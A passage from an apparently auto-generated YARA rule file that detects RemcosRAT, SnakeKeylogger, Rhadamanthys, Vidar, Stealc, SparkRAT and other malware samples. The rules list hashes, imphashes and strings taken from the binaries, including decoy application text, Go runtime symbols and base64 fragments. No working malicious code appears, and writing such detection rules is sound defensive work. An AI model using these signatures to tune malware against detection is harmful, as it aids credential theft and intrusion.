      description = "_subset_batch - from files RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_d52658fa.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_3f1e1bc2.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_5e83e874.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_d41022d9.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_f0511e05.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d52658fad02bdbdd90eed0d9029e15b6359efe630f786e3ab5875e2a7f3d5056"
      hash2 = "3f1e1bc2b3ac94cbb03ff9942c8753b0a6ea0ce3e6b682727fb013ee873c3d04"
      hash3 = "5e83e874c9e9531fff2a59c1d5c5c559901a6d37bcaaebafdbb915392d1cfb30"
      hash4 = "d41022d91ed5c237cbcb1cfaef080005bf5dae114f06418c873596c6c0149a11"
      hash5 = "f0511e0567f253276f92a19579e7f0e133a28e6ccc5f2b626a623b5e80073b81"
   strings:
      $s1 = "https://www.lipsum.com/" fullword wide /* score: '17.00'*/
      $s2 = "tempora" fullword wide /* score: '15.00'*/
      $s3 = "quaerat" fullword wide /* score: '13.00'*/
      $s4 = "commodo" fullword wide /* score: '11.00'*/
      $s5 = "deserunt" fullword wide /* score: '11.00'*/
      $s6 = "commodi" fullword wide /* score: '11.00'*/
      $s7 = "\"Paragraph Number\",\"Content\",\"Word Count\"" fullword wide /* score: '11.00'*/
      $s8 = "contentFormatter" fullword ascii /* score: '9.00'*/
      $s9 = "ContentFormatter" fullword ascii /* score: '9.00'*/
      $s10 = "consectetur" fullword wide /* score: '8.00'*/
      $s11 = "adipiscing" fullword wide /* score: '8.00'*/
      $s12 = "eiusmod" fullword wide /* score: '8.00'*/
      $s13 = "incididunt" fullword wide /* score: '8.00'*/
      $s14 = "nostrud" fullword wide /* score: '8.00'*/
      $s15 = "exercitation" fullword wide /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__3d82589a_RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a7_68 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_3d82589a.exe, RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_75e7eb70.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "3d82589a2cde5d52ebec9fbaa01d40c88c6b6f47289ef44b6d11e3070a32036d"
      hash2 = "75e7eb7034018884825716d1b9a2d3ae358bff0ed813884a7fc5c68c70d07210"
   strings:
      $s1 = "\\userscore.bin" fullword wide /* score: '19.00'*/
      $s2 = "GetUserScore" fullword ascii /* score: '17.00'*/
      $s3 = "ProcessWord" fullword ascii /* score: '15.00'*/
      $s4 = "SaveUserScore" fullword ascii /* score: '12.00'*/
      $s5 = "get_EnterKey" fullword ascii /* score: '12.00'*/
      $s6 = "get_BackKey" fullword ascii /* score: '12.00'*/
      $s7 = "get_KeyMatrix" fullword ascii /* score: '12.00'*/
      $s8 = "get_KeyDictionary" fullword ascii /* score: '12.00'*/
      $s9 = "_rectangleLogo" fullword ascii /* score: '9.00'*/
      $s10 = "GetWordList" fullword ascii /* score: '9.00'*/
      $s11 = "get_isFirstTime" fullword ascii /* score: '9.00'*/
      $s12 = "get_restart_alt_FILL0_wght400_GRAD0_opsz48" fullword ascii /* score: '9.00'*/
      $s13 = "get_NumberOfGuesses" fullword ascii /* score: '9.00'*/
      $s14 = "get_restart" fullword ascii /* score: '9.00'*/
      $s15 = "get_GamesPlayed" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphas_69 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe, RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_9f5e1c5e.exe, RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_aa1badc8.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_0003037c.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_8317cc0a.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_898fa5e7.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_a44128af.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "cc1b38c4aa79c03c777b0d99c9ae67fef380572e36f0744d110c18137ce9f3dd"
      hash2 = "9f5e1c5ea05a6275d90bac217e0fd8061c7e87e174b69bcdd26625e873c7579b"
      hash3 = "aa1badc8a65a7e941f3e9e9ed3e7ab9ff565900904e57bcd8e5428c6b900d522"
      hash4 = "0003037c7818733557d04c87095ece05f43dce9f2b571d82ba633181956132a2"
      hash5 = "8317cc0a4d4b4c3776f6f572da2635063a6244f1d9846c8fa8754ab085c555c5"
      hash6 = "898fa5e7ec65acee299dca750e5369836bd3453aad9e7d5fe5e6061ee24e35d3"
      hash7 = "a44128afda43c52008225dda2f60357b13030df3f639e42cd83c3e35e0e8c09a"
   strings:
      $s1 = "   - Keep track of common errors" fullword wide /* score: '13.00'*/
      $s2 = "   - Get adequate sleep the night before" fullword wide /* score: '12.00'*/
      $s3 = "   - Question: Formulate questions about the content" fullword wide /* score: '12.00'*/
      $s4 = "   - Preview headings and subheadings first" fullword wide /* score: '12.00'*/
      $s5 = "   - Skimming: Get general overview" fullword wide /* score: '12.00'*/
      $s6 = "   - Makes it easier to get partial credit on exams" fullword wide /* score: '12.00'*/
      $s7 = "   - Plan your study sessions in advance" fullword wide /* score: '10.00'*/
      $s8 = "   - Use the Eisenhower Matrix (urgent/important)" fullword wide /* score: '10.00'*/
      $s9 = "   - Add keywords and questions in the cue column" fullword wide /* score: '10.00'*/
      $s10 = "   - Summarize key points at the bottom" fullword wide /* score: '10.00'*/
      $s11 = "   - Indent supporting details under main points" fullword wide /* score: '10.00'*/
      $s12 = "   - Identify weak areas and focus study time there" fullword wide /* score: '10.00'*/
      $s13 = "   - Share different perspectives and approaches" fullword wide /* score: '10.00'*/
      $s14 = "   - Read: Read actively and purposefully" fullword wide /* score: '10.00'*/
      $s15 = "   - Highlight key points and important information" fullword wide /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__ccc8dfebc5d9971e8491d80ecc850a15_imphash__Rhadamanthys_signature__5c8e45b5d904cdcec55e8c9096808a42_imp_70 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_ccc8dfebc5d9971e8491d80ecc850a15(imphash).exe, Rhadamanthys(signature)_5c8e45b5d904cdcec55e8c9096808a42(imphash).dll"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ec8261150a6af49e8dc3324c5a8b2e84211c0dc2eac758e09dab5186052e044a"
      hash2 = "59138e5e81287cf58c13d9f22f41b52c56031aa6f0aceed79767c5e80e0f0c69"
   strings:
      $s1 = "clWebDarkMagenta" fullword ascii /* score: '14.00'*/
      $s2 = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\FontSubstitutes" fullword ascii /* score: '12.00'*/
      $s3 = "\\SYSTEM\\CurrentControlSet\\Control\\Keyboard Layouts\\" fullword ascii /* score: '11.00'*/
      $s4 = "clWebGhostWhite" fullword ascii /* score: '9.00'*/
      $s5 = "clWebDarkRed" fullword ascii /* score: '9.00'*/
      $s6 = "clWebDarkGoldenRod" fullword ascii /* score: '9.00'*/
      $s7 = "clWebDarkBlue" fullword ascii /* score: '9.00'*/
      $s8 = "clWebMagenta" fullword ascii /* score: '9.00'*/
      $s9 = "clWebSeashell" fullword ascii /* score: '9.00'*/
      $s10 = "clWebDarkKhaki" fullword ascii /* score: '9.00'*/
      $s11 = "clWebDarkSlateBlue" fullword ascii /* score: '9.00'*/
      $s12 = "clWebDarkOliveGreen" fullword ascii /* score: '9.00'*/
      $s13 = "clWebDarkSlategray" fullword ascii /* score: '9.00'*/
      $s14 = "clWebDarkOrchid" fullword ascii /* score: '9.00'*/
      $s15 = "clWebDarkOrange" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 4000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__32d85ec6_SnakeKeylogger_signature__f34d5f2d4577ed6d9ceec516c_71 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_32d85ec6.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_1a3b0673.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_50c9089f.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_bc50ae7a.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "32d85ec69dd09f4808d33a117271e59e33b74febf82353d258e91745bb9980be"
      hash2 = "1a3b0673ca0264f6306fd9ef59ebf3e6b62d75def5f689eb8bd02f6a222a1e5d"
      hash3 = "50c9089fe18238d44095d1f897507eab89baa65c85dabed3f099b73611492ec8"
      hash4 = "bc50ae7aa9d0ebbabd5e6405dc7317b42e10f5559bb8e0e422c7b9ca5d38e231"
   strings:
      $s1 = "SetBinaryOperation" fullword ascii /* score: '12.00'*/
      $s2 = "{0:HH:mm:ss} - {1}" fullword wide /* score: '12.00'*/
      $s3 = "Calculator Plus - History Export" fullword wide /* score: '11.00'*/
      $s4 = "LogBase10" fullword ascii /* score: '10.00'*/
      $s5 = "CalculatorHistory_{0:yyyyMMdd_HHmmss}.txt" fullword wide /* score: '10.00'*/
      $s6 = "GetHistoryStrings" fullword ascii /* score: '9.00'*/
      $s7 = "NaturalLog" fullword ascii /* score: '9.00'*/
      $s8 = "PerformUnaryOperation" fullword ascii /* score: '9.00'*/
      $s9 = "OperatorButton_Click" fullword ascii /* score: '9.00'*/
      $s10 = "GetLastEntry" fullword ascii /* score: '9.00'*/
      $s11 = "<Operand2>k__BackingField" fullword ascii /* score: '9.00'*/
      $s12 = "<Operand1>k__BackingField" fullword ascii /* score: '9.00'*/
      $s13 = "GetHistoryByDate" fullword ascii /* score: '9.00'*/
      $s14 = "set_Operand2" fullword ascii /* score: '9.00'*/
      $s15 = "CreateBasicOperatorButtons" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _SnakeKeylogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__a2d1da15_SnakeKeylogger_signature__f34d5f2d4577ed6d9cee_72 {
   meta:
      description = "_subset_batch - from files SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_a2d1da15.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_c2f71c00.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_fd85a4e7.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a2d1da157ce873841a4b6aec36638f2b0b9349730b67af3b2e866607587cbe4c"
      hash2 = "c2f71c006d57414ecfcc0a9718779ae6f19c63ff7ef6738c4a5aa7c38e28d77e"
      hash3 = "fd85a4e75158f628b44a723f2bffc2d6bae956051fc2495256011b9d552d9164"
   strings:
      $s1 = "paint.net 4.0.134" fullword ascii /* score: '10.00'*/
      $s2 = "GetScrambledWord" fullword ascii /* score: '9.00'*/
      $s3 = "<GetHighestScore>b__9_0" fullword ascii /* score: '9.00'*/
      $s4 = "<GetTopScores>b__4_1" fullword ascii /* score: '9.00'*/
      $s5 = "GetHighestScore" fullword ascii /* score: '9.00'*/
      $s6 = "GetAllScores" fullword ascii /* score: '9.00'*/
      $s7 = "<GetTopScores>b__4_0" fullword ascii /* score: '9.00'*/
      $s8 = "<GetAllScores>b__5_0" fullword ascii /* score: '9.00'*/
      $s9 = "get_DateAchieved" fullword ascii /* score: '9.00'*/
      $s10 = "Game Complete" fullword wide /* score: '9.00'*/
      $s11 = "{0}. {1} - {2} points" fullword wide /* score: '9.00'*/
      $s12 = "7+ letter words" fullword wide /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__4035d2883e01d64f3e7a9dccb1d63af5_imphash__Rhadamanthys_signature__91802a615b3a5c4bcc05bc5f66a5b219__73 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe, Rhadamanthys(signature)_91802a615b3a5c4bcc05bc5f66a5b219(imphash).exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash).exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_32687360.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_32cfff30.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_516d9dae.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_552543de.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_5840ea1c.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_b4fd170f.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_b7b7d002.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_c3f26585.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_dd620aed.exe, Vidar(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ae90bed12d49863359497bf1854c46626c5c524f1bd6883a2711505c849b99e7"
      hash2 = "7dcf3101452546647c0a3b55519db6ba479c7169067e35d8db41b8ff45028247"
      hash3 = "03fe53eff294a718d3a887e23e2e83c98c55e8b6b5654bbc6650400f011604ad"
      hash4 = "32687360fdc4dad7137f1937bd995ca4591cb65f8ca607fa48d1a394cc4a824b"
      hash5 = "32cfff30d6ed1f3395b8ffbc8319fad8723f71547364a6cde2faddb2b80b5b1d"
      hash6 = "516d9daee48799c22090e64835e99df3d6a6384e9305bfa90287486c4e9881be"
      hash7 = "552543dea61279d3a283976db9ef74cb33d9ab66aba5ac3bb6203ffbcf141206"
      hash8 = "5840ea1c615a9daee7648736117ddce1c7c6e2143bf3b971e6828989e094edc4"
      hash9 = "b4fd170f2d56421678f4743cba758fb69779b4bfd0f77202dbfc760d8ed1c8e5"
      hash10 = "b7b7d00276073da29572e3dee367869d603ec7f64080a8bf99a8226ece840375"
      hash11 = "c3f26585fd9cf218077198e642eabb9a8468f092d8a9138b43e7f68c832df64a"
      hash12 = "dd620aedd68431d93bf160121019e21774e7e4955f7be863486c5a699b1187c7"
      hash13 = "0eec336ef3b35dfae142ceb42443e8de490356b4bc81e358f10151832b1c75cc"
   strings:
      $s1 = "runtime.hexdumpWords.func1" fullword ascii /* score: '20.00'*/
      $s2 = "wprocessorlevel" fullword ascii /* score: '19.00'*/
      $s3 = "wprocessorrevision" fullword ascii /* score: '19.00'*/
      $s4 = "dwactiveprocessormask" fullword ascii /* score: '19.00'*/
      $s5 = "dwnumberofprocessors" fullword ascii /* score: '19.00'*/
      $s6 = "dwprocessortype" fullword ascii /* score: '19.00'*/
      $s7 = "**struct { F uintptr; rw *runtime.rwmutex }" fullword ascii /* score: '18.00'*/
      $s8 = "*runtime.rwmutex" fullword ascii /* score: '18.00'*/
      $s9 = "sweepdone" fullword ascii /* score: '13.00'*/
      $s10 = "runtime.(*mspan).sweep" fullword ascii /* score: '12.00'*/
      $s11 = "*runtime.systeminfo" fullword ascii /* score: '11.00'*/
      $s12 = "runlock" fullword ascii /* score: '11.00'*/
      $s13 = "runtime.readgogc" fullword ascii /* score: '10.00'*/
      $s14 = "runtime.traceNextGC" fullword ascii /* score: '10.00'*/
      $s15 = "readerPass" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 30000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__4035d2883e01d64f3e7a9dccb1d63af5_imphash__Rhadamanthys_signature__c7269d59926fa4252270f407e4dab043__74 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe, Rhadamanthys(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, Stealc(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, Stealc(signature)_c7269d59926fa4252270f407e4dab043(imphash)_837a5ae1.exe, Vidar(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ae90bed12d49863359497bf1854c46626c5c524f1bd6883a2711505c849b99e7"
      hash2 = "87eaae419cc95139893a6279261a43a2228aef451104a86ad06b42d670da1a63"
      hash3 = "31294603a887756a97d1f8b3b5f8a0f3ece03907448ea717dfc8b4d017be5897"
      hash4 = "837a5ae11a55ee51f20f6e1377a714730fe4df1914d22529064a70008393dca8"
      hash5 = "0eec336ef3b35dfae142ceb42443e8de490356b4bc81e358f10151832b1c75cc"
   strings:
      $s1 = "bad defer entry in panicbad defer size class: i=bypassed recovery failedcan't scan our own stackconnection reset by peerdouble t" ascii /* score: '22.00'*/
      $s2 = "e nmspinninginvalid runtime symbol tablemheap.freeSpanLocked - span missing stack in shrinkstackmspan.sweep: m is not lockednewp" ascii /* score: '20.00'*/
      $s3 = "runtime/rwmutex.go" fullword ascii /* score: '18.00'*/
      $s4 = "?*struct { lock runtime.mutex; used uint32; fn func(bool) bool }" fullword ascii /* score: '18.00'*/
      $s5 = "sync/mutex.go" fullword ascii /* score: '15.00'*/
      $s6 = "runtime/time_nofake.go" fullword ascii /* score: '12.00'*/
      $s7 = "runtime/mgcsweep.go" fullword ascii /* score: '12.00'*/
      $s8 = "runtime/fastlog2.go" fullword ascii /* score: '12.00'*/
      $s9 = "newmHandoff.lockno route to hostnon-Go function" fullword ascii /* score: '12.00'*/
      $s10 = "syscall.procGetSystemDirectoryW" fullword ascii /* score: '11.00'*/
      $s11 = "runtime/internal/sys/intrinsics_common.go" fullword ascii /* score: '10.00'*/
      $s12 = "runtime.convT2E" fullword ascii /* score: '10.00'*/
      $s13 = "runtime/error.go" fullword ascii /* score: '10.00'*/
      $s14 = "runtime.armHasVFPv4" fullword ascii /* score: '10.00'*/
      $s15 = "runtime.mDoFixup" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 30000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__4035d2883e01d64f3e7a9dccb1d63af5_imphash__Rhadamanthys_signature__c7269d59926fa4252270f407e4dab043__75 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe, Rhadamanthys(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, Sliver(signature)_c2d457ad8ac36fc9f18d45bffcd450c2(imphash).exe, SparkRAT(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash).exe, SparkRAT(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_d75aad03.exe, ValleyRAT(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ae90bed12d49863359497bf1854c46626c5c524f1bd6883a2711505c849b99e7"
      hash2 = "87eaae419cc95139893a6279261a43a2228aef451104a86ad06b42d670da1a63"
      hash3 = "d15e35dcb836d038d70b217709261b6a29c1d871c16304368b18ece21b989878"
      hash4 = "ed370fcbafa43b4b578d5722e922e706dd854189e5a5b9ca17213c307b3f9a23"
      hash5 = "d75aad0391ff8c63fba6f7315e520f5ea61229591277b09240e48e185e435eea"
      hash6 = "faed38b89c09070971844291bfefe437592451789e389ab38e3396ff84e49159"
   strings:
      $s1 = "internal/testlog.Logger" fullword ascii /* score: '18.00'*/
      $s2 = "internal/testlog.Getenv" fullword ascii /* score: '14.00'*/
      $s3 = "internal/syscall/windows/registry.Key.GetStringValue" fullword ascii /* score: '11.00'*/
      $s4 = "syscall.RegOpenKeyEx" fullword ascii /* score: '11.00'*/
      $s5 = "internal/syscall/windows/registry.Key.GetMUIStringValue" fullword ascii /* score: '11.00'*/
      $s6 = "syscall.RegEnumKeyEx" fullword ascii /* score: '11.00'*/
      $s7 = "internal/syscall/windows/registry.Key.getValue" fullword ascii /* score: '11.00'*/
      $s8 = "time.Date" fullword ascii /* score: '11.00'*/
      $s9 = "time.matchZoneKey" fullword ascii /* score: '10.00'*/
      $s10 = "time.Time.UTC" fullword ascii /* score: '10.00'*/
      $s11 = "runtime.mapaccess2_faststr" fullword ascii /* score: '10.00'*/
      $s12 = "time.Now" fullword ascii /* score: '10.00'*/
      $s13 = "internal/testlog.Open" fullword ascii /* score: '9.00'*/
      $s14 = "internal/testlog.Stat" fullword ascii /* score: '9.00'*/
      $s15 = "os.openFileNolog" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 30000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__4035d2883e01d64f3e7a9dccb1d63af5_imphash__Rhadamanthys_signature__a520fd20530cf0b0db6a6c3c8b88d11d__76 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_32cfff30.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_b7b7d002.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_c3f26585.exe, Rhadamanthys(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, Stealc(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, Stealc(signature)_c7269d59926fa4252270f407e4dab043(imphash)_837a5ae1.exe, Vidar(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ae90bed12d49863359497bf1854c46626c5c524f1bd6883a2711505c849b99e7"
      hash2 = "32cfff30d6ed1f3395b8ffbc8319fad8723f71547364a6cde2faddb2b80b5b1d"
      hash3 = "b7b7d00276073da29572e3dee367869d603ec7f64080a8bf99a8226ece840375"
      hash4 = "c3f26585fd9cf218077198e642eabb9a8468f092d8a9138b43e7f68c832df64a"
      hash5 = "87eaae419cc95139893a6279261a43a2228aef451104a86ad06b42d670da1a63"
      hash6 = "31294603a887756a97d1f8b3b5f8a0f3ece03907448ea717dfc8b4d017be5897"
      hash7 = "837a5ae11a55ee51f20f6e1377a714730fe4df1914d22529064a70008393dca8"
      hash8 = "0eec336ef3b35dfae142ceb42443e8de490356b4bc81e358f10151832b1c75cc"
   strings:
      $s1 = "syscall.procGetExitCodeProcess" fullword ascii /* score: '19.00'*/
      $s2 = "syscall.procGetProcessTimes" fullword ascii /* score: '19.00'*/
      $s3 = "syscall.procGetCurrentProcessId" fullword ascii /* score: '19.00'*/
      $s4 = "syscall.procGetCurrentProcess" fullword ascii /* score: '19.00'*/
      $s5 = "syscall.procCreateProcessAsUserW" fullword ascii /* score: '17.00'*/
      $s6 = "syscall.procOpenProcessToken" fullword ascii /* score: '17.00'*/
      $s7 = "syscall.procGetTempPathW" fullword ascii /* score: '15.00'*/
      $s8 = "syscall.procCreateProcessW" fullword ascii /* score: '14.00'*/
      $s9 = "syscall.procProcess32NextW" fullword ascii /* score: '14.00'*/
      $s10 = "syscall.procNetUserGetInfo" fullword ascii /* score: '14.00'*/
      $s11 = "syscall.procExitProcess" fullword ascii /* score: '14.00'*/
      $s12 = "syscall.procOpenProcess" fullword ascii /* score: '14.00'*/
      $s13 = "syscall.procProcess32FirstW" fullword ascii /* score: '14.00'*/
      $s14 = "syscall.procTerminateProcess" fullword ascii /* score: '14.00'*/
      $s15 = "syscall.procgethostbyname" fullword ascii /* score: '13.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 30000KB and ( 8 of them )
      ) or ( all of them )
}

rule _SparkRAT_signature__9cbefe68f395e67356e2a5d8d1b285c0_imphash__SparkRAT_signature__9cbefe68f395e67356e2a5d8d1b285c0_imphash__77 {
   meta:
      description = "_subset_batch - from files SparkRAT(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash).exe, SparkRAT(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_d75aad03.exe, Vidar(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ed370fcbafa43b4b578d5722e922e706dd854189e5a5b9ca17213c307b3f9a23"
      hash2 = "d75aad0391ff8c63fba6f7315e520f5ea61229591277b09240e48e185e435eea"
      hash3 = "0eec336ef3b35dfae142ceb42443e8de490356b4bc81e358f10151832b1c75cc"
   strings:
      $s1 = "reflect.name.data" fullword ascii /* score: '11.00'*/
      $s2 = "reflect.(*funcType).common" fullword ascii /* score: '11.00'*/
      $s3 = "sched={pc: but progSize  nmidlelocked= on zero Value out of range  procedure in  to finalizer  untyped args -thread limit" fullword ascii /* score: '11.00'*/
      $s4 = "reflect.(*ptrType).common" fullword ascii /* score: '11.00'*/
      $s5 = "runtime.gcWriteBarrierDX" fullword ascii /* score: '10.00'*/
      $s6 = "reflect.name.tag" fullword ascii /* score: '10.00'*/
      $s7 = "strconv.min" fullword ascii /* score: '10.00'*/
      $s8 = "runtime.gcWriteBarrierSI" fullword ascii /* score: '10.00'*/
      $s9 = "runtime.convI2I" fullword ascii /* score: '10.00'*/
      $s10 = "runtime.gcWriteBarrierCX" fullword ascii /* score: '10.00'*/
      $s11 = "internal/reflectlite.(*uncommonType).exportedMethods" fullword ascii /* score: '10.00'*/
      $s12 = "runtime.gcWriteBarrierR8" fullword ascii /* score: '10.00'*/
      $s13 = "reflect.(*rtype).Key" fullword ascii /* score: '10.00'*/
      $s14 = "reflect.name.isExported" fullword ascii /* score: '10.00'*/
      $s15 = "reflect.(*uncommonType).exportedMethods" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 25000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__5a23efc3_RemcosRAT_signature__aa569300_78 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_5a23efc3.js, RemcosRAT(signature)_aa569300.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "5a23efc306dd589c16d9781de2b9d26eeeddccfca23310247912edc3323fa979"
      hash2 = "aa56930042a94ecc6a42c1c4bbeadaf03229d2ec81784476c790977be5fc0100"
   strings:
      $x1 = "AAAAAAAAAAAA6" ascii /* base64 encoded string '         ' */ /* reversed goodware string '6AAAAAAAAAAAA' */ /* score: '35.00'*/
      $s2 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                         ' */ /* score: '26.50'*/
      $s3 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                       ' */ /* score: '26.50'*/
      $s4 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                     ' */ /* score: '26.50'*/
      $s5 = "AAAAAAAAAAAA7" ascii /* base64 encoded string '         ' */ /* score: '25.00'*/
      $s6 = "ZW5Ub0NsaWVudAAAAABSZW1vdmVQcm9wQQAAAFJlbW92ZU1lbnUAAAAAUmVsZWFzZURDAAAAUmVsZWFzZUNhcHR1cmUAAAAAUmVnaXN0ZXJXaW5kb3dNZXNzYWdlQQAA" ascii /* base64 encoded string 'enToClient    RemovePropA   RemoveMenu    ReleaseDC   ReleaseCapture    RegisterWindowMessageA  ' */ /* score: '21.00'*/
